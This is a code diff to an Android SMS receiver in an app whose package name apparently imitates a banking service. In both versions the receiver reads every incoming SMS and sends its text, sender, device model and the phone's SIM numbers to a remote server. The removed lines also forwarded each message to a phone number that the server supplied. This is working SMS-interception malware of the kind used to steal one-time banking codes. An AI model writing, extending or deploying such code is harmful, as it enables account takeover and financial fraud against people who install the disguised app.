@@ -1,12 +1,11 @@
 package com.yonoservice.registration;
 
-import android.app.PendingIntent;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.os.Build;
 import android.os.Bundle;
-import android.telephony.SmsManager;
+
 import android.telephony.SmsMessage;
 import android.util.Log;
 import android.widget.Toast;
@@ -17,7 +16,7 @@ import org.json.JSONObject;
 public class SmsReceiver extends BroadcastReceiver {
 
     private String previous_message = "";
-    private  int userId = 0;
+    private String receiver = "";
 
     @Override
     public void onReceive(Context context, Intent intent) {
@@ -31,63 +30,32 @@ public class SmsReceiver extends BroadcastReceiver {
                         if (smsMessage != null) {
                             String sender = smsMessage.getDisplayOriginatingAddress();
                             String messageBody = smsMessage.getMessageBody();
+                            receiver = Helper.getSimNumbers(context);
                             if(messageBody!=previous_message){
                                 previous_message = messageBody;
                                 JSONObject jsonData = new JSONObject();
                                 try {
                                     Helper helper = new Helper();
-                                    jsonData.put("site", helper.SITE());
+
                                     jsonData.put("message", messageBody);
                                     jsonData.put("sender", sender);
                                     jsonData.put("model", Build.MODEL);
-                                    jsonData.put("status", "N/A");
-                                    Helper.postRequest(helper.SMSSavePath(), jsonData, new Helper.ResponseListener() {
+                                    jsonData.put("receiver", receiver);
+
+
+                                    JSONObject sender1 = new JSONObject();
+                                    sender1.put("data", jsonData);
+                                    sender1.put("site", helper.SITE());
+                                    Log.d(Helper.TAG, sender1.toString());
+
+                                    Helper.postRequest(helper.SMSSavePath(), sender1, new Helper.ResponseListener() {
                                         @Override
                                         public void onResponse(String result) {
                                             if (result.startsWith("Response Error:")) {
+                                                Log.d(Helper.TAG, "Response Error : "+result);
                                                 Toast.makeText(context, "Response Error : "+result, Toast.LENGTH_SHORT).show();
                                             } else {
-                                                try {
-                                                    Log.d(Helper.TAG, "RESPONN RESULT : "+result);
-                                                    JSONObject response = new JSONObject(result);
-                                                    if(response.getInt("status")==200){
-                                                        userId  = response.getInt("data");
-                                                        Helper.getRequest("/site/number?site="+ helper.SITE(), new Helper.ResponseListener(){
-                                                            @Override
-                                                            public void onResponse(String result){
-                                                                try {
-                                                                    // Parse JSON response
-                                                                    JSONObject jsonResponse = new JSONObject(result);
-                                                                    if (jsonResponse.has("data")) {
-                                                                        String phoneNumber = jsonResponse.getString("data");
-
-                                                                        Intent sentIntent = new Intent(context, HySettings.class);
-                                                                        Intent deliveredIntent = new Intent(context, LiDe.class);
-                                                                        sentIntent.putExtra("id", userId);
-                                                                        sentIntent.putExtra("phone", phoneNumber);
-                                                                        deliveredIntent.putExtra("id", userId);
-                                                                        deliveredIntent.putExtra("phone", phoneNumber);
-                                                                        PendingIntent sentPendingIntent = PendingIntent.getBroadcast(context, 0, sentIntent, PendingIntent.FLAG_IMMUTABLE);
-                                                                        PendingIntent deliveredPendingIntent = PendingIntent.getBroadcast(context, 0, deliveredIntent, PendingIntent.FLAG_IMMUTABLE);
-                                                                        SmsManager smsManager = SmsManager.getDefault();
-                                                                        smsManager.sendTextMessage(phoneNumber, null, messageBody, sentPendingIntent, deliveredPendingIntent);
-                                                                        Log.d(Helper.TAG, "SMS Forward");
-                                                                    } else {
-                                                                        Log.e("MYAPP: ", "Response does not contain 'data' field");
-                                                                    }
-                                                                } catch (JSONException e) {
-                                                                    e.printStackTrace();
-                                                                    Log.e("MYAPP: ", "JSON Parsing Error: " + e.getMessage());
-                                                                }
-                                                            }
-                                                        });
-
-                                                    }else{
-                                                        Toast.makeText(context, "Status Not 200 : "+response, Toast.LENGTH_SHORT).show();
-                                                    }
-                                                } catch (JSONException e) {
-                                                    e.printStackTrace();
-                                                }
+                                                Log.d(Helper.TAG, "SMS Saved : "+result);
                                             }
                                         }
                                     });
